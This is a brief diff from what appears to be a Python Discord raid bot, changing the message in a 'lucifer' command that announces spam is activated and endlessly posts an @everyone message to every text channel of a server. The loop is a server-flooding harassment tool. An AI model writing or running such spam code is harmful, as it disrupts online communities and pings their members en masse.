@@ -169,7 +169,7 @@ async def lucifer(ctx):
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
     while True:
         for channel in ctx.guild.text_channels:
-            await channel.send("Ссылку скинь на сервер @everyone")
+            await channel.send("Люцифер ТОП @everyone")
 
 
 @client.command()
